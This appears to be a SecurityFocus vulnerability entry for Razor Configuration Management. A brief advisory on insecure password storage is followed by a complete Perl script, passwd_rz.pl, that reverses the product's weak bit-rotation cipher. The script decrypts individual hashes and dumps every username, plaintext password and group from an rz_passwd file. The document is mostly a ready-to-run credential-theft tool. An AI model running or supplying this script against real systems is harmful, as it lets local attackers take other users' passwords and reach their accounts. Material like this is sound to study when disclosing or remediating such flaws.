source: http://www.securityfocus.com/bid/1424/info
 
The Razor Configuration Management program stores passwords in an insecure manner.
 
A local attacker can obtain the Razor passwords, and either seize control of the software and relevant databases or use those passwords to access other users' accounts on the network. 

#!/usr/local/bin/perl

#
#  Title:	passwd_rz.pl
#  Author:	Shawn A. Clifford
#  Date:	2000-June-15
#  Purpose:	Encrypt/decrypt Visible Systems Corp.' Razor passwords
#  Usage:	passwd_rz.pl [ hex_hash | password_file_name ]
#
#		When run without arguments, this program will prompt for
#		a plaintext password and produce the ciphertext that Razor
#		would create for the same string.
#		Eg.:  ./passwd_rz.pl
#
#			Enter a password, max 8 chars:  WayLame  
#			Hash (in hex):  D5585E13585B59
#
#		When passed a hex-character string, the program will
#		generate the corresponding plaintext password.
#		Eg.:  ./passwd_rz.pl D5585E13585B59
#
#			Decrypting input hex string:  D5585E13585B59
#			Plaintext password:           WayLame 
#
#		When passed a filename for a Razor password file (rz_passwd),
#		the program will dump all of the entries in the password
#		file.  Each entry contains a username, password, and group.
#		Eg.:  ./passwd_rz.pl rz_passwd
#
#			Decrypting Razor password file:  rz_passwd
#
#			Username           Password         Group
#			--------           --------         -----
#			luser123           lamerz           please
#			luser45            cant             fix
#			buckwheat          code             this
#			.
#			.
#			.
#			tester1            CCCCCCCC         test
#			tester2            AAAAAA           test
#
#			233 password entries
#


use strict;

#
#  Defines
#
my $arg;			# Command line argument
my $PLEN = 8;		# Maximum number of chars in a password
my $PGLEN = 22;		# Output page length
my @hash;			# Password hash (err, lame cipher)
my $passwd;			# Plaintext password
my $byte;			# A single byte/char
my $buffer;			# Record from the password file
my $i;			# Counter/index
my $user;			# Username from password file
my $group;			# Group name from password file
my $rec_fmt = 'A17 C17 A17';	# rz_passwd record format
my $rec_size = length(pack($rec_fmt, ()));  # Size of a password file record


if ($#ARGV < 0) {	# We want to encrypt a password

   #
   #  Get a password
   #
   print "\nEnter a password, max 8 chars:  ";
   $passwd = <STDIN>;
   chomp $passwd;


   #
   #  Encrypt the password
   #
   print "Hash (in hex):  ";
   for ($i=0; $i < length($passwd) && $i < $PLEN; $i++) {
  
      #
      #  For each byte in the password, rotate right 2 bits
      #
      $byte = unpack("C", substr($passwd,$i,1)) >> 2;
      $byte += unpack("C", substr($passwd,$i,1)) << 6;

      #
      #  Mask off the resultant low byte and save
      #
      $hash[$i] = $byte & 0x00ff;
      printf "%X", $hash[$i];
   }
   print "\n\n";

} else {		# We want to decrypt a rz_passwd file or hex string

   $arg = shift;

   if ( -f ${arg} ) {	# It's a file to process

      print "\nDecrypting Razor password file:  $arg\n";
      open(IN, "<${arg}") || die "Can't open passwd file: $!";

      $i = 0;
      while ( read(IN, $buffer, $rec_size) == $rec_size ) {
         if ($i % $PGLEN == 0) {
            print "\nUsername           Password         Group\n";
            print "--------           --------         -----\n";
         }
         ($user, @hash, $group) = unpack($rec_fmt, $buffer);
         $group = substr($buffer, 34, 17);  # unpack didn't give me this,
why?
         printf "%-17s  %-15s  %-17s\n", $user, decrypt(@hash), $group;
         $i++;
      }
      printf "\n%d password entries\n\n", $i;
      close(IN);

   } else {		# It had better be a string of hex digits!

      print "\nDecrypting input hex string:  $arg\n";

      #
      #  Convert ASCII character string to a binary array
      #
      @hash = ();
      for ($i=0; $i < (length($arg)/2) && $i < $PLEN; $i++) {
         $byte = hex(substr($arg, $i*2, 2));
         $hash[$i] = $byte;
      }

      #
      #  Call the decrypt function to print the plaintext password
      #
      printf "Plaintext password:           %s\n\n", decrypt(@hash);

   }

}

sub decrypt {
   my @hash = @_;		# Pick up the passed array
   my $passwd = ();		# Zero the output plaintext scalar
   my $i;
   my $byte;


   #
   #  Decrypt the lamely enciphered password
   #
   for ($i=0; $i < $PLEN; $i++) {

      #
      #  Convert NULLs to spaces
      #
      if ($hash[$i] == 0) {
         $passwd = $passwd . " ";
         next;
      }

      #
      #  For each byte in the hash, rotate left 2 bits
      #
      $byte = $hash[$i] << 2;
      $byte += ($hash[$i] >> 6) & 0x03;

      #
      #  Mask off the resultant low byte and save
      #
      $passwd = $passwd . chr($byte & 0x00ff);

   }

   return $passwd;
}
